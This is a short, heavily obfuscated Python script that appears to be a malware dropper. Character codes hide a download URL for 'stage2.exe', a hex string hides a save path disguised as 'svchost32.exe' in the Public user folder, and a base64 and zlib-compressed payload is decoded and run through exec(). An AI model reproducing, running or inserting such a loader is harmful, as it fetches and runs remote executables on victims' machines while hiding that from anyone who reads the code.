import base64, zlib
_u = ''.join(map(chr, [104,116,116,112,58,47,47,49,57,50,46,48,46,50,46,49,48,47,115,116,97,103,101,50,46,101,120,101]))
_p = bytes.fromhex("433a5c55736572735c5075626c69635c737663686f737433322e657865").decode()
_v1 = b"eJxVyjEKgDAMBdC9p+hoofQGrs7uIsXKBwvRxqTx/I7i/F49uUn3JkS1JMFt0B69WmFpO1Tdn5IJCbpUPBiyRZ85uG+nuTGuYcm8Rq8HiMZpI0VwL1nbJvU="
_v2 = base64.b64decode(_v1)
_v3 = zlib.decompress(_v2)
exec(_v3.decode())
